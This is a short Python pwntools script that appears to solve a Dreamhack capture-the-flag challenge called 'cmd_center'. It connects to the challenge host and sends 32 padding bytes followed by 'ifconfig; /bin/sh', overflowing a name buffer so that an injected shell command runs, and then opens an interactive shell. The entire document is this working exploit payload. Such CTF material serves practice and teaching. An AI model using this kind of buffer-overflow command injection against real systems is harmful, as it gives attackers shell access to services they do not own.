from pwn import *

p = remote("host3.dreamhack.games", 17642)
e = ELF("./cmd_center")


payload = b'A' * 32
payload += b"ifconfig; /bin/sh"

p.sendlineafter("Center name: ", payload)

p.interactive()

